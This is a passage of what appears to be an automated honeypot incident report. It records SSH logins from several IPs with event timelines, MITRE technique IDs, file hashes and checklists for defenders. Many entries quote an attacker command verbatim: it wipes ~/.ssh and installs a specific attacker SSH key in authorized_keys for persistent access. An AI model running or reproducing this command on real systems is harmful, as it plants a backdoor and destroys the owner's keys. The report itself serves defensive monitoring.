| `2026-05-25 07:25:38` | `cowrie.login.success` |
| `2026-05-25 07:25:38` | `cowrie.session.params` |
| `2026-05-25 07:25:38` | `cowrie.command.input` |
| `2026-05-25 07:25:38` | `cowrie.command.failed` |
| `2026-05-25 07:25:39` | `cowrie.log.closed` |
| `2026-05-25 07:25:39` | `cowrie.session.params` |
| `2026-05-25 07:25:39` | `cowrie.command.input` |
| `2026-05-25 07:25:39` | `cowrie.session.file_download` |
| `2026-05-25 07:25:39` | `cowrie.log.closed` |
| `2026-05-25 07:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6655b783304f

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:25 |
| **Last Seen** | 2026-05-25 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:25:42` | `cowrie.session.connect` |
| `2026-05-25 07:25:42` | `cowrie.client.version` |
| `2026-05-25 07:25:42` | `cowrie.client.kex` |
| `2026-05-25 07:25:43` | `cowrie.login.success` |
| `2026-05-25 07:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77f5f41637a

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-05-25 07:29 |
| **Last Seen** | 2026-05-25 07:29 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:29:18` | `cowrie.session.connect` |
| `2026-05-25 07:29:18` | `cowrie.client.version` |
| `2026-05-25 07:29:19` | `cowrie.client.kex` |
| `2026-05-25 07:29:20` | `cowrie.login.success` |
| `2026-05-25 07:29:20` | `cowrie.session.params` |
| `2026-05-25 07:29:20` | `cowrie.command.input` |
| `2026-05-25 07:29:20` | `cowrie.command.failed` |
| `2026-05-25 07:29:21` | `cowrie.log.closed` |
| `2026-05-25 07:29:22` | `cowrie.session.params` |
| `2026-05-25 07:29:22` | `cowrie.command.input` |
| `2026-05-25 07:29:22` | `cowrie.session.file_download` |
| `2026-05-25 07:29:22` | `cowrie.log.closed` |
| `2026-05-25 07:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b349037ac0

| Field | Detail |
|---|---|
| **Source IP** | `49.64.242[.]249` |
| **First Seen** | 2026-05-25 07:29 |
| **Last Seen** | 2026-05-25 07:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:29:30` | `cowrie.session.connect` |
| `2026-05-25 07:29:30` | `cowrie.client.version` |
| `2026-05-25 07:29:30` | `cowrie.client.kex` |
| `2026-05-25 07:29:33` | `cowrie.login.success` |
| `2026-05-25 07:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.242[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.64.242[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab2f1dc14cfa

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:31 |
| **Last Seen** | 2026-05-25 07:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:31:39` | `cowrie.session.connect` |
| `2026-05-25 07:31:39` | `cowrie.client.version` |
| `2026-05-25 07:31:40` | `cowrie.client.kex` |
| `2026-05-25 07:31:41` | `cowrie.login.success` |
| `2026-05-25 07:31:41` | `cowrie.session.params` |
| `2026-05-25 07:31:41` | `cowrie.command.input` |
| `2026-05-25 07:31:41` | `cowrie.command.failed` |
| `2026-05-25 07:31:42` | `cowrie.log.closed` |
| `2026-05-25 07:31:42` | `cowrie.session.params` |
| `2026-05-25 07:31:42` | `cowrie.command.input` |
| `2026-05-25 07:31:43` | `cowrie.session.file_download` |
| `2026-05-25 07:31:43` | `cowrie.log.closed` |
| `2026-05-25 07:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad87ec971251

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:31 |
| **Last Seen** | 2026-05-25 07:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:31:46` | `cowrie.session.connect` |
| `2026-05-25 07:31:46` | `cowrie.client.version` |
| `2026-05-25 07:31:46` | `cowrie.client.kex` |
| `2026-05-25 07:31:47` | `cowrie.login.success` |
| `2026-05-25 07:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2b95155e40

| Field | Detail |
|---|---|
| **Source IP** | `45.194.17[.]45` |
| **First Seen** | 2026-05-25 07:33 |
| **Last Seen** | 2026-05-25 07:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:33:43` | `cowrie.session.connect` |
| `2026-05-25 07:33:43` | `cowrie.client.version` |
| `2026-05-25 07:33:44` | `cowrie.client.kex` |
| `2026-05-25 07:33:47` | `cowrie.login.success` |
| `2026-05-25 07:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.194.17[.]45` to AbuseIPDB if not already reported
- [ ] Block `45.194.17[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40fd6a624372

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:35 |
| **Last Seen** | 2026-05-25 07:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:35:49` | `cowrie.session.connect` |
| `2026-05-25 07:35:49` | `cowrie.client.version` |
| `2026-05-25 07:35:49` | `cowrie.client.kex` |
| `2026-05-25 07:35:50` | `cowrie.login.success` |
| `2026-05-25 07:35:51` | `cowrie.session.params` |
| `2026-05-25 07:35:51` | `cowrie.command.input` |
| `2026-05-25 07:35:51` | `cowrie.command.failed` |
| `2026-05-25 07:35:51` | `cowrie.log.closed` |
| `2026-05-25 07:35:52` | `cowrie.session.params` |
| `2026-05-25 07:35:52` | `cowrie.command.input` |
| `2026-05-25 07:35:52` | `cowrie.session.file_download` |
| `2026-05-25 07:35:52` | `cowrie.log.closed` |
| `2026-05-25 07:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b614f21d86

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:35 |
| **Last Seen** | 2026-05-25 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:35:55` | `cowrie.session.connect` |
| `2026-05-25 07:35:55` | `cowrie.client.version` |
| `2026-05-25 07:35:55` | `cowrie.client.kex` |
| `2026-05-25 07:35:56` | `cowrie.login.success` |
| `2026-05-25 07:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f71bdbc0f50

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:36 |
| **Last Seen** | 2026-05-25 07:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:36:35` | `cowrie.session.connect` |
| `2026-05-25 07:36:35` | `cowrie.client.version` |
| `2026-05-25 07:36:35` | `cowrie.client.kex` |
| `2026-05-25 07:36:36` | `cowrie.login.success` |
| `2026-05-25 07:36:36` | `cowrie.session.params` |
| `2026-05-25 07:36:36` | `cowrie.command.input` |
| `2026-05-25 07:36:36` | `cowrie.command.failed` |
| `2026-05-25 07:36:37` | `cowrie.log.closed` |
| `2026-05-25 07:36:37` | `cowrie.session.params` |
| `2026-05-25 07:36:37` | `cowrie.command.input` |
| `2026-05-25 07:36:37` | `cowrie.session.file_download` |
| `2026-05-25 07:36:37` | `cowrie.log.closed` |
| `2026-05-25 07:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215d2bca4a91

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:36 |
| **Last Seen** | 2026-05-25 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:36:40` | `cowrie.session.connect` |
| `2026-05-25 07:36:40` | `cowrie.client.version` |
| `2026-05-25 07:36:41` | `cowrie.client.kex` |
| `2026-05-25 07:36:42` | `cowrie.login.success` |
| `2026-05-25 07:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-829041aac6c9

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:44 |
| **Last Seen** | 2026-05-25 07:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:44:17` | `cowrie.session.connect` |
| `2026-05-25 07:44:17` | `cowrie.client.version` |
| `2026-05-25 07:44:18` | `cowrie.client.kex` |
| `2026-05-25 07:44:19` | `cowrie.login.success` |
| `2026-05-25 07:44:19` | `cowrie.session.params` |
| `2026-05-25 07:44:19` | `cowrie.command.input` |
| `2026-05-25 07:44:19` | `cowrie.command.failed` |
| `2026-05-25 07:44:20` | `cowrie.log.closed` |
| `2026-05-25 07:44:20` | `cowrie.session.params` |
| `2026-05-25 07:44:20` | `cowrie.command.input` |
| `2026-05-25 07:44:21` | `cowrie.session.file_download` |
| `2026-05-25 07:44:21` | `cowrie.log.closed` |
| `2026-05-25 07:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88d49788ce28

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:44 |
| **Last Seen** | 2026-05-25 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:44:24` | `cowrie.session.connect` |
| `2026-05-25 07:44:24` | `cowrie.client.version` |
| `2026-05-25 07:44:24` | `cowrie.client.kex` |
| `2026-05-25 07:44:25` | `cowrie.login.success` |
| `2026-05-25 07:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab9912ead0e

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:48 |
| **Last Seen** | 2026-05-25 07:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:48:19` | `cowrie.session.connect` |
| `2026-05-25 07:48:19` | `cowrie.client.version` |
| `2026-05-25 07:48:19` | `cowrie.client.kex` |
| `2026-05-25 07:48:20` | `cowrie.login.success` |
| `2026-05-25 07:48:21` | `cowrie.session.params` |
| `2026-05-25 07:48:21` | `cowrie.command.input` |
| `2026-05-25 07:48:21` | `cowrie.command.failed` |
| `2026-05-25 07:48:22` | `cowrie.log.closed` |
| `2026-05-25 07:48:22` | `cowrie.session.params` |
| `2026-05-25 07:48:22` | `cowrie.command.input` |
| `2026-05-25 07:48:22` | `cowrie.session.file_download` |
| `2026-05-25 07:48:22` | `cowrie.log.closed` |
| `2026-05-25 07:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-721ddbce236e

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:48 |
| **Last Seen** | 2026-05-25 07:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:48:25` | `cowrie.session.connect` |
| `2026-05-25 07:48:25` | `cowrie.client.version` |
| `2026-05-25 07:48:26` | `cowrie.client.kex` |
| `2026-05-25 07:48:27` | `cowrie.login.success` |
| `2026-05-25 07:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b99612a101b

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:51 |
| **Last Seen** | 2026-05-25 07:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:51:13` | `cowrie.session.connect` |
| `2026-05-25 07:51:13` | `cowrie.client.version` |
| `2026-05-25 07:51:13` | `cowrie.client.kex` |
| `2026-05-25 07:51:14` | `cowrie.login.success` |
| `2026-05-25 07:51:15` | `cowrie.session.params` |
| `2026-05-25 07:51:15` | `cowrie.command.input` |
| `2026-05-25 07:51:15` | `cowrie.command.failed` |
| `2026-05-25 07:51:15` | `cowrie.log.closed` |
| `2026-05-25 07:51:16` | `cowrie.session.params` |
| `2026-05-25 07:51:16` | `cowrie.command.input` |
| `2026-05-25 07:51:16` | `cowrie.session.file_download` |
| `2026-05-25 07:51:16` | `cowrie.log.closed` |
| `2026-05-25 07:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6918c64f6ffa

| Field | Detail |
|---|---|
| **Source IP** | `34.72.208[.]101` |
| **First Seen** | 2026-05-25 07:51 |
| **Last Seen** | 2026-05-25 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:51:19` | `cowrie.session.connect` |
| `2026-05-25 07:51:19` | `cowrie.client.version` |
| `2026-05-25 07:51:19` | `cowrie.client.kex` |
| `2026-05-25 07:51:20` | `cowrie.login.success` |
| `2026-05-25 07:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.72.208[.]101` to AbuseIPDB if not already reported
- [ ] Block `34.72.208[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb52c3572c22

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-25 07:52 |
| **Last Seen** | 2026-05-25 07:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 07:52:32` | `cowrie.session.connect` |
| `2026-05-25 07:52:32` | `cowrie.client.version` |
| `2026-05-25 07:52:33` | `cowrie.client.kex` |
| `2026-05-25 07:52:34` | `cowrie.login.success` |
| `2026-05-25 07:52:34` | `cowrie.session.params` |
| `2026-05-25 07:52:34` | `cowrie.command.input` |
| `2026-05-25 07:52:34` | `cowrie.command.failed` |
| `2026-05-25 07:52:35` | `cowrie.log.closed` |
| `2026-05-25 07:52:35` | `cowrie.session.params` |
| `2026-05-25 07:52:35` | `cowrie.command.input` |
| `2026-05-25 07:52:35` | `cowrie.session.file_download` |
| `2026-05-25 07:52:35` | `cowrie.log.closed` |
| `2026-05-25 07:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
